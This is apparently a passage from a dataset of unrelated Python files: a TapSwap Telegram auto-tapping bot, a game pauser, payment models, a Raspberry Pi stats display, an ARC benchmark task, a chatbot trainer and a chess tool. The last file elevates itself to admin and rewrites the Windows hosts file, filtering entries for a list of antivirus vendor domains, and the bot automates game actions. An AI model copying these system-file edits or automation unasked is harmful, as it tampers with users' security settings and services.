**kwargs)\n\n\ndef getUrlsync():\n    return client(\n        functions.messages.RequestWebViewRequest(\n            peer='tapswap_bot',\n            bot='tapswap_bot',\n            platform='ios',\n            from_bot_menu=False,\n            url='https://app.tapswap.ai/',\n        )\n    )\n\nasync def getUrl():\n    return await client(\n        functions.messages.RequestWebViewRequest(\n            peer='tapswap_bot',\n            bot='tapswap_bot',\n            platform='ios',\n            from_bot_menu=False,\n            url='https://app.tapswap.ai/',\n        )\n    )\n\ndef authToken(url):\n    headers = {\n        \"accept\": \"/\",\n        \"accept-language\": \"en-US,en;q=0.9,fa;q=0.8\",\n        \"content-type\": \"application/json\",\n        \"sec-fetch-dest\": \"empty\",\n        \"sec-fetch-mode\": \"cors\",\n        \"sec-fetch-site\": \"same-site\",\n        \"x-cv\": \"323\"\n    }\n    payload = {\n        \"init_data\": urllib.parse.unquote(url).split('tgWebAppData=')[1].split('&tgWebAppVersion')[0],\n        \"referrer\":\"\"\n    }\n    response = requests.post('https://api.tapswap.ai/api/account/login', headers=headers, data=json.dumps(payload)).json()\n\n    return response['access_token']\n\n\ndef submit_taps(taps:int, auth:str, timex=time.time()):\n    headers = {\n        \"accept\": \"/\",\n        \"accept-language\": \"en-US,en;q=0.9,fa;q=0.8\",\n        \"content-type\": \"application/json\",\n        \"sec-fetch-dest\": \"empty\",\n        \"sec-fetch-mode\": \"cors\",\n        \"sec-fetch-site\": \"same-site\",\n        \"Authorization\": f\"Bearer {auth}\"\n    }\n    \n    payload = {\"taps\":taps, \"time\":timex}\n    response = session.post('https://api.tapswap.ai/api/player/submit_taps', headers=headers, json=payload).json()\n    # Energy: response['player']['energy']\n    return response\n\ndef apply_boost(auth:str, type:str=\"energy\"):\n    # Types: turbo, energy\n    headers = {\n        \"accept\": \"/\",\n        \"accept-language\": \"en-US,en;q=0.9,fa;q=0.8\",\n        \"content-type\": \"application/json\",\n        \"sec-fetch-dest\": \"empty\",\n        \"sec-fetch-mode\": \"cors\",\n        \"sec-fetch-site\": \"same-site\",\n        \"Authorization\": f\"Bearer {auth}\"\n    }\n    payload = {\"type\":type}\n    response = session.post('https://api.tapswap.ai/api/player/apply_boost', headers=headers, json=payload).json()\n    return response\n\ndef upgrade(auth:str, type:str=\"charge\"):\n    # Types: energy, tap, charge\n    headers = {\n        \"accept\": \"/\",\n        \"accept-language\": \"en-US,en;q=0.9,fa;q=0.8\",\n        \"content-type\": \"application/json\",\n        \"sec-fetch-dest\": \"empty\",\n        \"sec-fetch-mode\": \"cors\",\n        \"sec-fetch-site\": \"same-site\",\n        \"Authorization\": f\"Bearer {auth}\"\n    }\n    payload = {\"type\":type}\n    response = session.post('https://api.tapswap.ai/api/player/apply_boost', headers=headers, json=payload).json()\n    return response\n\ndef convert_uptime(uptime):\n    hours = int(uptime // 3600)\n    minutes = int((uptime % 3600) // 60)\n    return hours, minutes\n\n\nasync def answer(event):\n    global db\n    text = event.raw_text\n  ",
    "import dearpygui.dearpygui as dpg\nimport subprocess\n\ndpg.create_context()\ndpg.create_viewport(title=\"pause my game\", width=440, height=480)\n\n# \u516c\u5171\u51fd\u6570\ndef runinsubprocess(thing):\n    creation_flags = subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP |subprocess.CREATE_BREAKAWAY_FROM_JOB\n    subprocess.Popen(thing, shell=True, creationflags=creation_flags,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n\n# \u6309\u94ae\u51fd\u6570\ndef loadconfig():\n    with open('game_name.txt', 'r') as f:\n        game_name = f.read().splitlines()\n    dpg.configure_item('game_name_exe', items=game_name)\n    dpg.set_value('infotext' , 'Game loaded: ' + str(len(game_name)) + ' games')\n    # \u81ea\u52a8\u9009\u62e9 \u7b2c\u4e00\u4e2a\n    if len(game_name) > 0:\n        dpg.set_value('game_name_exe', game_name[0])\n\ndef editconfig():\n    runinsubprocess('notepad game_name.txt')\n\ndef pausegame():\n    dpg.configure_item('indicator', default_value='Game Paused' , color=(255,0,0))\n    game_name = dpg.get_value('game_name_exe')\n    runinsubprocess('PsSuspend ' + game_name)\n\ndef resumegame():\n    dpg.configure_item('indicator', default_value='Game Resumed' , color=(0,255,0))\n    game_name = dpg.get_value('game_name_exe')\n    runinsubprocess('PsSuspend -r ' + game_name)\n\ndef opentaskmgr():\n    runinsubprocess('taskmgr')\n\n# \u52a0\u8f7d\u5b57\u4f53\nwith dpg.font_registry():\n    with dpg.font(\"afont.ttf\", 18) as font1:  # \u589e\u52a0\u4e2d\u6587\u7f16\u7801\u8303\u56f4\uff0c\u6570\u5b57\u662f\u5b57\u53f7,\u4f1a\u6bd4\u5b98\u65b9\u5b57\u4f53\u6a21\u7cca\n        # dpg.add_font_range_hint(dpg.mvFontRangeHint_Default)\n        dpg.add_font_range_hint(dpg.mvFontRangeHint_Chinese_Simplified_Common)\n        # dpg.add_font_range_hint(dpg.mvFontRangeHint_Chinese_Full)\n    dpg.bind_font(font1)\n\n# \u7a97\u4f53\u4e3b\u51fd\u6570\nwith dpg.window(label='pauser',  width=400, height=400,pos=(10, 10)):\n    # dpg.add_input_text(default_value='PsSuspend DevilMayCry5.exe' , tag='pause_DevilMayCry5_cmd')\n    # dpg.add_input_text(default_value='PsSuspend -r DevilMayCry5.exe ' , tag='remuse_DevilMayCry5_cmd')\n\n    dpg.add_combo(default_value='' , items=['XXX.exe'], tag='game_name_exe')\n    dpg.add_text(default_value='Game Status untouched' , color=(120,120,120) ,tag='indicator')\n    dpg.add_spacing(count=3)\n\n    dpg.add_button(label='Pause', callback=pausegame);dpg.add_same_line()\n    dpg.add_button(label='Resume', callback=resumegame);dpg.add_same_line()\n    dpg.add_button(label='Taskmgr', callback=opentaskmgr)\n    dpg.add_spacing(count=3)\n    dpg.add_separator()\n    dpg.add_spacing(count=3)\n\n    dpg.add_button(label='reload config', callback=loadconfig);dpg.add_same_line()\n    dpg.add_button(label='edit config', callback=editconfig)\n    dpg.add_text(tag='infotext', default_value='Game loaded:', color=(120,120,120))\n    # dpg.show_documentation()\n# onload \u4e8b\u4ef6\nloadconfig()\n\ndpg.setup_dearpygui()\ndpg.show_viewport()\ndpg.start_dearpygui()\ndpg.destroy_context()",
    "\"\"\"\nthe just_pay response model\n\"\"\"\nfrom typing import Optional\n\nfrom pydantic import Field\nfrom pydantic import BaseModel\n\n\nclass CardPaymentDetails(BaseModel):\n    \"\"\"\n    the card payment details model.\n    \"\"\"\n    applePay: bool\n    cardExpiration: Optional[str]\n    cardMask: Optional[str]\n    cardOwnerEntityType: Optional[str]\n    googlePay: bool\n    merchantId: Optional[str]\n    preauthorize: bool\n    processingVendor: Optional[str]\n    processingVendorId: Optional[str]\n    rrn: Optional[str]\n    secureCardId: Optional[str]\n    terminalId: Optional[str]\n    token: Optional[str]\n\n\nclass Hooks(BaseModel):\n    \"\"\"\n    the webhooks model\n    \"\"\"\n    errorRedirectGateway: Optional[str]\n    successRedirectGateway: Optional[str]\n    webhookGateway: Optional[str]\n\n\nclass PaymentData(BaseModel):\n    \"\"\"\n    the payment data model\n    \"\"\"\n    amount: int\n    blockedAmount: Optional[int]\n    blockedDate: Optional[str]\n    capturedAmount: Optional[int]\n    capturedDate: Optional[str]\n    cardPayment: CardPaymentDetails\n    channel: Optional[str]\n    createdDate: str\n    crossCurrencySettlement: Optional[str]\n    currency: str\n    fee: Optional[int]\n    hooks: Hooks\n    id: int\n    idempotencyKey: str\n    language: Optional[str]\n    lastModifiedDate: str\n    metadata: Optional[dict]\n    network: Optional[str]\n    payer: Optional[dict]\n    payment_url: str = Field(\n        alias=\"paymentUrl\"\n    )\n    receipt: Optional[str]\n    refundedAmount: Optional[int]\n    refundedDate: Optional[str]\n    rejectReason: Optional[str]\n    rejectedDate: Optional[str]\n    requesterId: int\n    reverseDate: Optional[str]\n    reversedAmount: Optional[int]\n    sandBox: bool\n    settled: Optional[str]\n    settledBalanceAmount: Optional[int]\n    settledDate: Optional[str]\n    shareLink: Optional[str]\n    source: str\n    status: str\n    transactionId: str\n    type: str\n    version: int\n    walletPayment: Optional[dict]\n\n\nclass Data(BaseModel):\n    \"\"\"\n    the data model\n    \"\"\"\n    payment: PaymentData\n\n\nclass Status(BaseModel):\n    \"\"\"\n    the status model\n    \"\"\"\n    errors: Optional[str]\n    message: Optional[str]\n    type: Optional[str]\n",
    "# -*- coding: utf-8 -*-\n#\n# Author: @billz\n# Author URI: https://github.com/billz\n# Description: RaspAP stats display for the Adafruit Mini PiTFT,\n#   a 135x240 Color TFT add-on for the Raspberry Pi.\n#   Based on Adafruit's rgb_display_ministats.py\n# See: https://github.com/adafruit/Adafruit_CircuitPython_RGB_Display\n# License: MIT License\n\nimport time\nimport subprocess\nimport digitalio\nimport board\nfrom PIL import Image, ImageDraw, ImageFont\nimport adafruit_rgb_display.st7789 as st7789\n\n# Configuration for CS and DC pins\ncs_pin = digitalio.DigitalInOut(board.CE0)\ndc_pin = digitalio.DigitalInOut(board.D25)\nreset_pin = None\n\n# Config for display baudrate (default max is 24mhz)\nBAUDRATE = 64000000\n\n# Setup SPI bus using hardware SPI\nspi = board.SPI()\n\n# Create the ST7789 display\ndisp = st7789.ST7789(spi, cs=cs_pin, dc=dc_pin, rst=reset_pin, baudrate=BAUDRATE,\n                     width=240, height=240, x_offset=0, y_offset=80)\n\n# Create blank image with mode 'RGB'\nheight = disp.width   # swap height/width to rotate it to landscape\nwidth = disp.height\nimage = Image.new('RGB', (width, height))\nrotation = 90\n\n# Get a drawing object and clear the image\ndraw = ImageDraw.Draw(image)\ndraw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))\ndisp.image(image,rotation)\n\n# Define some constants\npadding = -2\ntop = padding\nbottom = height-padding\n# Move left to right keeping track of the current x position\nx = 0\ny = 80\n\n# Load DejaVu TTF Font\n# Install with: sudo apt-get install ttf-dejavu\nfont = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf', 24)\n\n# Turn on the backlight\nbacklight = digitalio.DigitalInOut(board.D22)\nbacklight.switch_to_output()\nbacklight.value = True\n\nwhile True:\n    # Draw a black filled box to clear the image\n    draw.rectangle((0, 0, width, height), outline=0, fill=0)\n\n    # Collect basic system stats\n    cmd = \"hostname -I | cut -d\\' \\' -f1\"\n    IP = \"IP: \"+subprocess.check_output(cmd, shell=True).decode(\"utf-8\")\n\n    cmd = \"pidof hostapd | wc -l | awk '{printf \\\"Hotspot: %s\\\", $1 == 1 ? \\\"Active\\\" : \\\"Down\\\"}'\"\n    Hostapd = subprocess.check_output(cmd, shell=True).decode(\"utf-8\")\n\n    cmd = \"vnstat -i wlan0 | grep tx: | awk '{printf \\\"Data Tx: %d %s\\\", $5,$6}'\"\n    DataTx = subprocess.check_output(cmd, shell=True).decode(\"utf-8\")\n\n    cmd = \"top -bn1 | grep load | awk '{printf \\\"CPU Load: %.2f\\\", $(NF-2)}'\"\n    CPU = subprocess.check_output(cmd, shell=True).decode(\"utf-8\")\n\n    cmd = \"free -m | awk 'NR==2{printf \\\"Mem: %sMB %.2f%%\\\", $3,$3*100/$2 }'\"\n    MemUsage = subprocess.check_output(cmd, shell=True).decode(\"utf-8\")\n\n    cmd = 'df -h | awk \\'$NF==\"/\"{printf \"Disk: %d/%d GB  %s\", $3,$2,$5}\\''\n    Disk = subprocess.check_output(cmd, shell=True).decode(\"utf-8\")\n\n    cmd = \"cat /sys/class/thermal/thermal_zone0/temp |  awk \\'{printf \\\"CPU Temp: %.1f C\\\", $(NF-0) / 1000}\\'\" # pylint: disable=line-too-long\n    Temp = subprocess.check_output(cmd, shell=True).decode(\"utf-8\")\n\n    # Write five lines of stats\n    y = top\n    draw.text((x, y), IP, font=font, fill=\"#ffffff\")\n    y += font.getsize(IP)[1]\n    draw.text((x, y), Hostapd, font=font, fill=\"#d46a6a\")\n    y += font.getsize(Hostapd)[1]\n    draw.text((x, y), DataTx, font=font, fill=\"#ffffff\")\n    y += font.getsize(DataTx)[1]\n    draw.text((x, y), MemUsage, font=font, fill=\"#d46a6a\")\n    y += font.getsize(MemUsage)[1]\n    draw.text((x, y), Disk, font=font, fill=\"#ffffff\")\n    y += font.getsize(Disk)[1]\n    draw.text((x, y), Temp, font=font, fill=\"#d46a6a\")\n\n    # Display image\n    disp.image(image, rotation)\n    time.sleep(.1)\n",
    "\"\"\"\nThink you have Solved Question Answering? Try ARC, the AI2 Reasoning Challenge\nhttps://arxiv.org/pdf/1803.05457.pdf\n\nThe ARC dataset consists of 7,787 science exam questions drawn from a variety\nof sources, including science questions provided under license by a research\npartner affiliated with AI2. These are text-only, English language exam questions\nthat span several grade levels as indicated in the files. Each question has a\nmultiple choice structure (typically 4 answer options). The questions are sorted\ninto a Challenge Set of 2,590 \u201chard\u201d questions (those that both a retrieval and\na co-occurrence method fail to answer correctly) and an Easy Set of 5,197 questions.\n\nHomepage: https://allenai.org/data/arc\n\"\"\"\nfrom lm_eval.base import MultipleChoiceTask\n\n\n_CITATION = \"\"\"\n@article{Clark2018ThinkYH,\n  title={Think you have Solved Question Answering? Try ARC, the AI2 Reasoning Challenge},\n  author={Peter Clark and Isaac Cowhey and Oren Etzioni and Tushar Khot and Ashish Sabharwal and Carissa Schoenick and Oyvind Tafjord},\n  journal={ArXiv},\n  year={2018},\n  volume={abs/1803.05457}\n}\n\"\"\"\n\n\nclass ARCEasy(MultipleChoiceTask):\n    VERSION = 0\n    DATASET_PATH = \"ai2_arc\"\n    DATASET_NAME = \"ARC-Easy\"\n\n    def has_training_docs(self):\n        return True\n\n    def has_validation_docs(self):\n        return True\n\n    def has_test_docs(self):\n        return True\n\n    def training_docs(self):\n        if self._training_docs is None:\n            self._training_docs = list(map(self._process_doc, self.dataset[\"train\"]))\n        return self._training_docs\n\n    def validation_docs(self):\n        return map(self._process_doc, self.dataset[\"validation\"])\n\n    def test_docs(self):\n        return map(self._process_doc, self.dataset[\"test\"])\n\n    def _process_doc(self, doc):\n        # NOTE: Some `doc[\"answerKey\"]`s are in numeric string format being one\n        # of {'1', '2', '3', '4', '5'}. We map them back to letters.\n        num_to_letter = {\"1\": \"A\", \"2\": \"B\", \"3\": \"C\", \"4\": \"D\", \"5\": \"E\"}\n        doc[\"answerKey\"] = num_to_letter.get(doc[\"answerKey\"], doc[\"answerKey\"])\n        out_doc = {\n            \"id\": doc[\"id\"],\n            \"query\": \"Question: \" + doc[\"question\"] + \"\\nAnswer:\",\n            \"choices\": doc[\"choices\"][\"text\"],\n            \"gold\": [\"A\", \"B\", \"C\", \"D\", \"E\"].index(doc[\"answerKey\"]),\n        }\n        return out_doc\n\n    def doc_to_text(self, doc):\n        return doc[\"query\"]\n\n    def should_decontaminate(self):\n        return True\n\n    def doc_to_decontamination_query(self, doc):\n        return doc[\"query\"]\n\n\nclass ARCChallenge(ARCEasy):\n    DATASET_PATH = \"ai2_arc\"\n    DATASET_NAME = \"ARC-Challenge\"\n",
    "import json\nimport random\nimport pickle\nimport numpy as np\n\nimport nltk\n# nltk.download('punkt')\n# nltk.download('wordnet')\nfrom nltk.stem import WordNetLemmatizer\n\nfrom tensorflow.keras.models import Sequential\nfrom tensorflow.keras.layers import Dense, Activation, Dropout\nfrom tensorflow.keras.optimizers import SGD\n\nlemmatizer = WordNetLemmatizer()\n\nintents = json.loads(open('intents.json').read())\n\nwords = []\nlabels = []\ndocuments = []\nignore = ['?', '!', '.', ',']\n\nfor intent in intents['intents']:\n    for pattern in intent['patterns']:\n        word_list = nltk.word_tokenize(pattern)\n\n        words.extend(word_list)\n\n        documents.append((word_list, intent['tag']))\n        if intent['tag'] not in labels:\n            labels.append(intent['tag'])\n\nwords = [lemmatizer.lemmatize(w.lower()) for w in words if w not in ignore]  # edited\nwords = sorted(list(set(words)))\n\nlabels = sorted(list(set(labels)))\n\npickle.dump(words, open('words.pkl', 'wb'))\npickle.dump(labels, open('labels.pkl', 'wb'))\n\ntrain_set = []\noutput_empty = [0] * len(labels)\n\nfor doc in documents:\n    bag = []\n    word_patterns = doc[0]\n\n    word_patterns = [lemmatizer.lemmatize(word.lower()) for word in word_patterns]\n\n    for word in words:\n        bag.append(1) if word in word_patterns else bag.append(0)\n\n    output_row = list(output_empty)\n    output_row[labels.index(doc[1])] = 1\n    train_set.append([bag, output_row])\n\nrandom.shuffle(train_set)\ntrain_set = np.array(train_set)\n\ntrain_x = list(train_set[:, 0])\ntrain_y = list(train_set[:, 1])\n\nmodel = Sequential(\n    [\n        Dense(128, input_shape=(len(train_x[0]),), activation='relu'),\n        Dropout(0.5),\n        Dense(64, activation='relu'),\n        Dropout(0.5),\n        Dense(len(train_y[0]), activation='softmax')\n    ]\n)\n\nsgd = SGD(lr=0.01, decay=1e-6, momentum=0.9, nesterov=True)\nmodel.compile(loss='categorical_crossentropy', optimizer=sgd, metrics=['accuracy'])\n\nhist = model.fit(np.array(train_x), np.array(train_y), epochs=500, batch_size=5, verbose=1)\nmodel.save('chatbot_model.h5', hist)\nprint(\"Done\")\n",
    "#!/usr/bin/python3\n#\n# Copyright 2024 Sami Kiminki\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\nfrom optparse import OptionParser\nfrom pathlib import Path\nimport berserk\nimport chess\nimport chess.engine\nimport chess.pgn\nimport datetime\nimport json\nimport logging\nimport sys\nimport traceback\n\nVERSION=\"0.1-dev\"\n\n\ndef enable_debug_logging(option, opt, value, parser):\n    logging.basicConfig(level=logging.DEBUG)\n\ndef processarguments():\n    parser = OptionParser(\n        version=\"novelty-grinder \" + VERSION,\n        usage = 'usage: novelty-grinder [options] FILE.pgn',\n        description = '''The Grand Novelty Grinder\nsearches for suprise moves and novelties with Lc0 and Lichess.''',\n        epilog='''Quick instructions:\n(1) Configure Lc0 for Nibbler. When using contempt, configure both colors\nseparately.\n(2) Prepare lines or games to analyze in FILE.pgn.\n(3) Run the novelty grinder to find interesting novelties and rarities.\nAnnotated PGN is written in stdout.''')\n\n    parser.add_option(\n        \"-E\", \"--engines-json\", dest=\"enginesJsonPath\",\n        help=\"Nibbler engines.json file [default: %default]\",\n        metavar=\"FILE\",\n        type=\"string\",\n        default=str(Path.home() / \".config\" / \"Nibbler\" / \"engines.json\"))\n\n    parser.add_option(\n        \"-T\", \"--lichess-token-file\", dest=\"lichessTokenFile\",\n        help=\"Lichess API token file. Optional, may help in case of getting \" +\n        \"API rate-limited. [default: %default]\",\n        metavar=\"FILE\",\n        type=\"string\")\n\n    parser.add_option(\n        \"-w\", \"--white-engine\", dest=\"whiteEngine\",\n        help=\"Engine for white side analysis. Full path can be omitted as long as \" +\n        \"the engine is unambiguous.\",\n        type=\"string\",\n        metavar=\"STR\")\n\n    parser.add_option(\n        \"-b\", \"--black-engine\", dest=\"blackEngine\",\n        help=\"Engine for black side analysis. Full path can be omitted as long as \" +\n        \"the engine is unambiguous.\",\n        metavar=\"STR\")\n\n    parser.add_option(\n        \"-e\", \"--engine\", dest=\"engine\",\n        help=\"Analysis engine for both sides. Full path can be omitted as long as \" +\n        \"the engine is unambiguous.\",\n        type=\"string\",\n        metavar=\"STR\")\n\n    parser.add_option(\n        \"-n\", \"--nodes\", dest=\"analysisNodes\",\n        help=\"Nodes per move to analyze. [default: %default]\",\n        type=\"int\",\n        metavar=\"NODES\",\n        default=100000)\n\n    parser.add_option(\n        \"\",  \"--eval-threshold\", dest=\"evalThresholdCp\",\n        help=\"Engine evaluation score threshold for considering novelties. Moves with at least \" +\n        \"(FIRST_PV_SCORE - EVAL_DIFF) evaluation score are considered for novelties. In centipawns. \" +\n        \"Note: Comparison is against the first PV move, not the highest PV evaluation. \"\n        \"[default: %default]\",\n        type=\"int\",\n        metavar=\"EVAL_DIFF\",\n        default=200)\n\n    parser.add_option(\n        \"\",  \"--rarity-threshold-freq\", dest=\"rarityThresholdFreq\",\n        help=\"Book moves that are played at most FREQ frequency are considered 'rare' moves. \" +\n        \"[default: %default]\",\n        type=\"float\",\n        metavar=\"FREQ\",\n        default=0.05)\n\n    parser.add_option(\n        \"\",  \"--rarity-threshold-count\", dest=\"rarityThresholdCount\",\n        help=\"Book move that is played at most NUM times total are considered 'rare' moves \" +\n        \"regardless of the frequency. [default: %default]\",\n        type=\"int\",\n        metavar=\"NUM\",\n        default=0)\n\n    parser.add_option(\n        \"\",  \"--first-move\", dest=\"firstMove\",\n        help=\"First move to analyze (skip previous). [default: %default]\",\n        type=\"int\",\n        metavar=\"MOVE_NUM\",\n        default=1)\n\n    parser.add_option(\n        \"\",  \"--book-cutoff\", dest=\"bookCutoff\",\n        help=\"Stop analysis when the book has fewer than at most NUM games. \" +\n        \"[default: %default]\",\n        type=\"int\",\n        metavar=\"NUM\",\n        default=2)\n\n    parser.add_option(\n        \"\",  \"--arrows\", dest=\"arrows\", default=False,\n        help=\"Add arrows in the annotated PGN: red = novelty; green = unpopular move.\",\n        action=\"store_true\")\n\n    parser.add_option(\n        \"\",  \"--debug\",\n        help=\"Enable debug mode\",\n        action=\"callback\",\n        callback=enable_debug_logging)\n\n    parser.add_option(\n        \"\", \"--double-check-nodes\", dest=\"doubleCheckNodes\",\n        help=\"After initial analysis, do focused analysis on candidate moves until they have at least NUM nodes. \" +\n        \"T",
    "# -*- Coding: Utf-8 -*- \r\n# -*- Imports -*- \r\nimport sys\r\nimport time\r\nimport ctypes\r\nimport msvcrt\r\nimport logging\r\nimport colorama\r\nfrom pystyle import *\r\n\r\n\r\ncolorama.init()\r\n\r\n# -*- Variables -*- \r\n__tool__ = \"test\"\r\n__version__ = \"1.0.1\"\r\n\r\n\r\n# -*- Console logging -*- \r\n\r\ndef log(message, **kwrgs):\r\n    \"\"\" logger handler. \"\"\"\r\n    fm = f\"{colorama.Fore.LIGHTBLACK_EX}[-( {colorama.Fore.LIGHTWHITE_EX}{time.strftime('%H:%M:%S', time.localtime())}{colorama.Fore.LIGHTBLACK_EX} )-]  {message} \"\r\n    if kwrgs:\r\n        fm += f\"\u00bb {', '.join([f'{key} > [{colorama.Fore.LIGHTBLACK_EX}{value}{colorama.Fore.LIGHTWHITE_EX}]' for key, value in kwrgs.items()])}\"\r\n    print(fm)\r\n\r\ndef title(title, **kwrgs):\r\n    \"\"\" set console title. \"\"\"\r\n    message = f\"{title}\"\r\n    if kwrgs:\r\n        message += f\"     |     {', '.join([f'{key} > [{value}]' for key, value in kwrgs.items()])}\"\r\n    ctypes.windll.kernel32.SetConsoleTitleW(f'Turbo {__tool__} >> ({__version__}) << | {message}')\r\n\r\n\r\n\r\ndef err(message, **kwrgs):\r\n    \"\"\" error \"\"\"\r\n    log(f\"{colorama.Fore.LIGHTBLACK_EX}[{colorama.Fore.RED}\u25cf{colorama.Fore.LIGHTBLACK_EX}]{colorama.Fore.LIGHTWHITE_EX} {message}\", **kwrgs)\r\n\r\ndef debug(message, **kwrgs):\r\n    \"\"\" debug | success \"\"\"\r\n    log(f\"{colorama.Fore.LIGHTBLACK_EX}[{colorama.Fore.LIGHTGREEN_EX}\u25cf{colorama.Fore.LIGHTBLACK_EX}]{colorama.Fore.LIGHTWHITE_EX} {message}\", **kwrgs)\r\n\r\ndef info(message, **kwrgs):\r\n    \"\"\" info \"\"\"\r\n    log(f\"{colorama.Fore.LIGHTBLACK_EX}[{colorama.Fore.LIGHTGREEN_EX}\u25cf{colorama.Fore.LIGHTBLACK_EX}]{colorama.Fore.LIGHTGREEN_EX} {colorama.Fore.LIGHTWHITE_EX}{message}\", **kwrgs)\r\n\r\ndef inpt(message):\r\n    \"\"\" input \"\"\"\r\n    answer = input(f\"{colorama.Fore.LIGHTBLACK_EX}[-( {colorama.Fore.LIGHTWHITE_EX}{time.strftime('%H:%M:%S', time.localtime())}{colorama.Fore.LIGHTBLACK_EX} )-]  [{colorama.Fore.BLUE}\u25cf{colorama.Fore.LIGHTBLACK_EX}]{colorama.Fore.LIGHTWHITE_EX} {message} {colorama.Fore.LIGHTBLACK_EX}\u00bb \")\r\n    return answer\r\n\r\ndef int_inpt(message):\r\n    \"\"\" integer input \"\"\"\r\n    while True:\r\n        try:\r\n            answer = int(input(f\"{colorama.Fore.LIGHTBLACK_EX}[-( {colorama.Fore.LIGHTWHITE_EX}{time.strftime('%H:%M:%S', time.localtime())}{colorama.Fore.LIGHTBLACK_EX} )-]  [{colorama.Fore.BLUE}\u25cf{colorama.Fore.LIGHTBLACK_EX}]{colorama.Fore.LIGHTWHITE_EX} {message} {colorama.Fore.LIGHTBLACK_EX}\u00bb \"))\r\n            return answer\r\n        except:\r\n            time.sleep(0.3)\r\n            info(\"Please enter a valid integer\")\r\n            time.sleep(0.3)\r\n\r\n\r\ndef ext_input():\r\n    \"\"\" exit input \"\"\"\r\n    try:\r\n        info(\"Press any key\") # u dont need to press enter here. any key is sufficient.\r\n        msvcrt.getch()\r\n    except:\r\n        inpt(\"Press enter\")\r\ndef asciiprint():\r\n    \"\"\" ascii print \"\"\"\r\n    ascii = \"\"\"\r\n\r\n\u250c\u252c\u2510\u250c\u2500\u2510\u252c\u250c\u2500\u250c\u2500\u2510\u250c\u2510\u250c  \u250c\u2500\u2510\u252c \u252c\u250c\u2500\u2510\u250c\u2500\u2510\u252c\u250c\u2500\u250c\u2500\u2510\u252c\u2500\u2510\r\n \u2502 \u2502 \u2502\u251c\u2534\u2510\u251c\u2524 \u2502\u2502\u2502  \u2502  \u251c\u2500\u2524\u251c\u2524 \u2502  \u251c\u2534\u2510\u251c\u2524 \u251c\u252c\u2518\r\n \u2534 \u2514\u2500\u2518\u2534 \u2534\u2514\u2500\u2518\u2518\u2514\u2518  \u2514\u2500\u2518\u2534 \u2534\u2514\u2500\u2518\u2514\u2500\u2518\u2534 \u2534\u2514\u2500\u2518\u2534\u2514\u2500\r\n                              \r\n    \"\"\"\r\n\r\n    ascii2 = \"\"\"\r\n(GG/POP)                      (V. 1.0.1)\r\n\r\n\r\n    \"\"\"\r\n    print(Colorate.Vertical(Colors.cyan_to_green, (Center.XCenter(ascii)), 1))\r\n    print(Colorate.Vertical(Colors.cyan_to_green, (Center.XCenter(ascii2)), 1))\r\n\r\n\r\n\r\n# -*- Debugger -*- \r\n# ~ call function -> start debugger() to start debugging\r\n\r\n\r\nclass CustomStreamHandler(logging.StreamHandler):\r\n    def emit(self, record):\r\n        try:\r\n            formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')  \r\n            self.setFormatter(formatter)\r\n            msg = self.format(record)\r\n            stream = self.stream\r\n            stream.write(msg + '\\n')\r\n            self.flush()\r\n        except (KeyboardInterrupt, SystemExit):\r\n            raise\r\n        except:\r\n            self.handleError(record)\r\n\r\n\r\nclass StdoutToLogger:\r\n    def __init__(self, logger, level=logging.INFO):\r\n        self.logger = logger\r\n        self.level = level\r\n\r\n    def write(self, message):\r\n        if message.rstrip() != \"\":\r\n            level = \"INFO\"\r\n            if \"DEBUG\" in message:\r\n                level = \"DEBUG\"\r\n            elif \"WARNING\" in message:\r\n                level = \"WARNING\"\r\n            elif \"ERROR\" in message:\r\n                level = \"ERROR\"\r\n            elif \"CRITICAL\" in message:\r\n                level = \"CRITICAL\"\r\n            \r\n            fm = f\"{colorama.Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M:%S')}] @ {level} >>{colorama.Fore.LIGHTWHITE_EX} {message}\"\r\n            self.logger.log(getattr(logging, level), message.rstrip())\r\n            #sys.__stdout__.write(fm + '\\n')  \r\n\r\n    def flush(self):\r\n        pass\r\n\r\ndef start_debugger():\r\n    logging.basicConfig(filename=f'{__tool__}.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')\r\n    logger = logging.getLogger('my_logger')\r\n    stream_handler = CustomStreamHandler(sys.stdout)\r\n    logger.addHandler(stream_handler)\r\n\r\n\r\n\r\n# -*- Extras -*-\r\n\r\ndef clear():\r\n    os.system('cls' if os.name == 'nt' else 'clear')\r\n\r\ndef exit():\r\n    sy",
    "import os, subprocess, ctypes, sys, getpass\n\nif ctypes.windll.shell32.IsUserAnAdmin() != 1:\n    ctypes.windll.shell32.ShellExecuteW(None, \"runas\", sys.executable, \" \".join(sys.argv), None, 1)\n    exit(0)\n\ntry:\n    hostfilepath = os.path.join(os.getenv('systemroot'), os.sep.join(subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /V DataBasePath', shell= True, capture_output= True).stdout.decode(errors= 'ignore').strip().splitlines()[-1].split()[-1].split(os.sep)[1:]), 'hosts')\n    with open(hostfilepath) as file:\n        data = file.readlines()\nexcept Exception as e:\n    print(e)\n    getpass.getpass(\"\")\n    exit(1)\n\nBANNED_URLs = ('virustotal.com', 'avast.com', 'totalav.com', 'scanguard.com', 'totaladblock.com', 'pcprotect.com', 'mcafee.com', 'bitdefender.com', 'us.norton.com', 'avg.com', 'malwarebytes.com', 'pandasecurity.com', 'avira.com', 'norton.com', 'eset.com', 'zillya.com', 'kaspersky.com', 'usa.kaspersky.com', 'sophos.com', 'home.sophos.com', 'adaware.com', 'bullguard.com', 'clamav.net', 'drweb.com', 'emsisoft.com', 'f-secure.com', 'zonealarm.com', 'trendmicro.com', 'ccleaner.com')\nnewdata = []\n\nfor i in data:\n    if any([(x in i) for x in BANNED_URLs]):\n        continue\n    else:\n        newdata.append(i)\n\nnewdata = '\\n'.join(newdata).replace('\\n\\n', '\\n')\n\ntry:\n    subprocess.run(\"attrib -r {}\".format(hostfilepath), shell= True, 